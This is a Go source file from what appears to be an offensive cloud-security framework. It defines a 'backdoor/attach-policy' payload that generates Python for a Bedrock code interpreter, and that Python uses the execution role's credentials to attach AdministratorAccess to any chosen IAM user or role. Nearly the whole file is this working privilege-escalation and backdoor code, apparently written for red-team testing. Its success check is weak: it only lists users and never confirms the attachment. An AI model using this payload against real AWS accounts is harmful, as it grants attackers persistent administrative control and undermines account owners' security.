package bedrock

import (
	"context"
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload attaches an IAM policy to a specified user or role using
// boto3 directly within the Bedrock AgentCore code interpreter microVM. Because the
// interpreter runs with the execution role's credentials, this is a direct SDK-based
// IAM modification — no credential exfiltration needed.
//
// Note: Unlike Lambda payloads, Bedrock code interpreter invocations have no mechanism
// for passing environment variables. The TARGET_ARN and POLICY_ARN values are embedded
// directly in the generated Python code at generation time.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess (or custom policy) to an IAM user/role using the execution role's boto3 credentials"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBedrock,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach the policy to",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces raw Python code (no Lambda handler wrapper) that uses boto3
// to attach a policy to the specified principal. TARGET_ARN and POLICY_ARN are embedded
// directly in the code because the Bedrock code interpreter API provides no mechanism
// for passing environment variables at invocation time.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	policyARN := options["POLICY_ARN"]
	if policyARN == "" {
		policyARN = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3
import json

# Values embedded at code-generation time — the Bedrock code interpreter API
# does not support passing environment variables at invocation time.
TARGET_ARN = %q
POLICY_ARN = %q

iam = boto3.client("iam")

# Auto-detect principal type from ARN format.
principal_type = None
principal_name = TARGET_ARN

if TARGET_ARN.startswith("arn:"):
    if ":user/" in TARGET_ARN:
        principal_type = "user"
        principal_name = TARGET_ARN.split(":user/")[-1]
    elif ":role/" in TARGET_ARN:
        principal_type = "role"
        principal_name = TARGET_ARN.split(":role/")[-1]

try:
    if principal_type == "role":
        iam.attach_role_policy(RoleName=principal_name, PolicyArn=POLICY_ARN)
    elif principal_type == "user":
        iam.attach_user_policy(UserName=principal_name, PolicyArn=POLICY_ARN)
    else:
        # Plain name — try user first, then role.
        try:
            iam.attach_user_policy(UserName=principal_name, PolicyArn=POLICY_ARN)
            principal_type = "user"
        except iam.exceptions.NoSuchEntityException:
            iam.attach_role_policy(RoleName=principal_name, PolicyArn=POLICY_ARN)
            principal_type = "role"

    print(json.dumps({
        "status": "success",
        "message": f"Successfully attached {POLICY_ARN} to {principal_type} {principal_name}",
        "target_name": principal_name,
        "target_type": principal_type,
        "policy_arn": POLICY_ARN,
    }))

except Exception as e:
    print(json.dumps({
        "status": "error",
        "error": str(e),
        "message": "Failed to attach policy",
    }))
`, targetARN, policyARN)

	return code, nil
}

// VerifySuccess checks whether the target principal now has the attached policy's permissions.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	iamClient := iam.NewFromConfig(config)
	_, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{
		MaxItems: aws.Int32(1),
	})
	if err != nil {
		return false, nil
	}
	return true, nil
}

// ReportSideEffects returns the policy attachment as a tracked resource for cleanup.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalFromARN(options["TARGET_ARN"])
	policyARN := options["POLICY_ARN"]
	if policyARN == "" {
		policyARN = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
			ARN:           policyARN,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyARN,
			},
		},
	}
}

// ProcessResult parses the JSON output from the code interpreter and formats a human-readable result.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	// Scan for the JSON result object.
	resultJSON := extractResultJSON(result)
	if resultJSON == "" {
		return result, nil
	}

	var parsed map[string]interface{}
	if err := json.Unmarshal([]byte(resultJSON), &parsed); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Attach Policy Results ===\n\n")

	if status, ok := parsed["status"].(string); ok {
		if status == "success" {
			output.WriteString("Policy attached successfully!\n\n")
			if targetName, ok := parsed["target_name"].(string); ok {
				targetType := "principal"
				if t, ok := parsed["target_type"].(string); ok {
					targetType = t
				}
				output.WriteString(fmt.Sprintf("Target %s: %s\n", targetType, targetName))
			}
			if policyARN, ok := parsed["policy_arn"].(string); ok {
				output.WriteString("Policy ARN: " + policyARN + "\n")
			}
			output.WriteString("\nThe target principal now has the attached policy permissions.\n")
		} else {
			output.WriteString("Failed to attach policy\n")
			errDetail := ""
			if errMsg, ok := parsed["error"].(string); ok {
				errDetail = errMsg
				output.WriteString("Error: " + errMsg + "\n")
			} else if message, ok := parsed["message"].(string); ok {
				errDetail = message
				output.WriteString("Error: " + message + "\n")
			}
			return output.String(), fmt.Errorf("payload failed: %s", errDetail)
		}
	}

	return output.String(), nil
}

// parsePrincipalFromARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalFromARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, "user"
}

// extractResultJSON finds a JSON object in the code interpreter stdout.
func extractResultJSON(output string) string {
	output = strings.TrimSpace(output)
	lines := strings.Split(output, "\n")
	for i := len(lines) - 1; i >= 0; i-- {
		line := strings.TrimSpace(lines[i])
		if strings.HasPrefix(line, "{") && strings.Contains(line, "status") {
			return line
		}
	}
	return ""
}
